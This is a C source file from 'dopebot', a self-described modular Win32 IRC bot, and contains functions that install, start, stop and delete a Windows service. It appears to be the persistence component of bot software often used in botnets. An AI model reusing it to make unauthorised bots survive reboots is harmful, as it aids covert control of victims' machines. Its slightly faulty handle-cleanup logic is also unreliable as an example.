/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_SERVICE
#include "bot.h"

//Install Service
bool install_service(char *szServiceName, char *szServicePath, DWORD dwServiceType, DWORD dwServiceStartup, bool bStartService)
{
	SC_HANDLE hManager, hService;

#ifndef NO_DEBUG
		printf("[DEBUG] Installing service, install_service()...\n");
#endif
		
		hManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		hService = CreateService(hManager, szServiceName, szServiceName, SERVICE_ALL_ACCESS, dwServiceType, dwServiceStartup, SERVICE_ERROR_NORMAL, szServicePath, NULL, NULL, NULL,  NULL, NULL);
	if (hService == NULL)
	{
			CloseServiceHandle(hService);
			CloseServiceHandle(hManager);
			return FALSE;
	}
	if (bStartService)
	{
			hService = OpenService(hManager, szServiceName, SERVICE_ALL_ACCESS);
		if (hService == NULL) return FALSE;
			StartService(hService, 0, NULL);
			CloseServiceHandle(hService);
			CloseServiceHandle(hManager);
	}
		return TRUE;
}

//Uninstall Service
bool uninstall_service(char *szServiceName)
{
	SC_HANDLE hManager, hService;
	SERVICE_STATUS serviceStatus;

#ifndef NO_DEBUG
		printf("[DEBUG] Uninstalling service, uninstall_service()...\n");
#endif

		hManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		hService = OpenService(hManager, szServiceName, SERVICE_ALL_ACCESS);
	if (hService == NULL)
	{
			CloseServiceHandle(hService);
			CloseServiceHandle(hManager);
			return FALSE;
	}
		ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
	if (hService == NULL) return FALSE;
		DeleteService(hService);
		CloseServiceHandle(hService);
		CloseServiceHandle(hManager);
		return TRUE;
}
#endif;